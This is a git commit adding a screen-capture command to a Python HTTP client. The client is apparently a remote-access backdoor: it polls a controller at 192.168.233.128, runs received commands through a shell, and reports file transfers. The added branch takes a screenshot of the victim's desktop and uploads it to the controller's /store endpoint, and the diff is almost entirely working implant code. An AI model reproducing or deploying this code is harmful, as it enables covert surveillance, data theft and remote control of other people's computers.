f533467efcd9f07352fd7b8306eef8753359e0e2
Michael Kirori <kirorikamau@yaoo.com>
2016-11-09 08:16:54 -0500

    Add screen capture functionality

--- http_client.py
+++ http_client.py
@@ -2,6 +2,9 @@ import requests
 import subprocess
 import time
 import os
+import tempfile
+import shutil
+from PIL import ImageGrab
 
 
 while True:
@@ -20,6 +23,16 @@ while True:
         else:
             post_response = requests.post(url='http://192.168.233.128',data='[-] File not found')
 
+    elif 'screencap' in command:
+        #Create a temporary directory to store image before we transfer it to the server
+        tmppath = tempfile.mkdtemp()
+        
+        ImageGrab.grab().save(tmppath + "\img.jpg", "JPEG")
+        url = 'http://192.168.233.128/store'
+        files = {'file': open(tmppath + "\img.jpg", "rb")}
+        r = requests.post(url, files=files)
+        files['file'].close()
+        shutil.rmtree(tmppath)
         
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
